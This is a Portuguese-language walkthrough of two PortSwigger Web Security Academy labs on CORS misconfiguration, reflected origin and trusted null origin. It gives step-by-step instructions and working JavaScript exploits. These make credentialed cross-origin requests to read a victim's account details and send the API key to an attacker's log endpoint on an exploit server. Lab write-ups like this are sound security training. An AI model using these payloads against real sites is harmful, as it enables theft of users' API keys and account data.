## Lab: CORS vulnerability with basic origin reflection
"This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter "

1. Faça a requisição para o caminho `GET /my-account?id=wiener`.
2. Observe no código fonte que uma requisição é feita na api para recuperar as informações de username, email e API key: 
```html
<script>
fetch('/accountDetails', {credentials:'include'}).then(r => r.json())
.then(j => document.getElementById('apikey').innerText = j.apikey)
</script>
```
3. Realize a requisição no caminho `/accountDetails` e veja que a resposta contém os headers `Access-Control-Allow-Origin:` e `Access-Control-Allow-Credentials: true` quando especificado uma Origin como `https://example.com`.  
4. A página do atacante terá o seguinte código: 
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://<LAB-ID>.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='/log?key='+this.responseText;
};
</script>
```
5. Entregue a requisição e veja os logs. As informações do usuário estarão presentes. Bastta decodificar e submeter a API key.

## CORS vulnerability with trusted null origin
"This website has an insecure CORS configuration in that it trusts the "null" origin.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter"

1. Com o proxy ligado realize o login, uma das requisições é `GET /accountDetails`, envie-a para o Repeater.
2. Insira o Header `Origin: exploit-server.com`, o servidor não responderá com `Access-Control-Allow-Origin`.
3. Faça o mesmo teste, mas com o header `Origin: null`, a resposta obtida terá `Access-Control-Allow-Origin: null`
4.  No exploit server, escreva o seguinte script e entregue para a vítima para receber a API key: 
```html
<iframe sandbox="allow-scripts" srcdoc="<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','https://LAB-ID.web-security-academy.net/accountDetails',true);
	req.withCredentials = true;
	req.send();
	
	function reqListener() {
		location='https://EXPLOIT-SERVER.exploit-server.net/log?key='+this.responseText;
	};
</script>"></iframe>
```
